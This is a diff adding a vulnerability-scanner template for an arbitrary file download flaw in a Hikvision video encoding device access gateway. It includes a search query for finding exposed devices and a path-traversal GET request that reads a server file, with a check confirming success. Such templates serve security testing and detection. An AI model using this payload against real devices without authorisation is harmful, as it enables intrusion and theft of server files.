@@ -1,0 +1,16 @@
+name: Hikvision Video Encoding Device Access Gateway Any File Download
+manual: true
+query: app="Hikvision-Video-coding-device-access-gateway" || title="视频编码设备接入网关"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"$file_name=")
+expression: r0()
+detail:
+  description: Hikvision is a world leading IoT solution provider with video as its
+    core competency.
+  tags: File Download
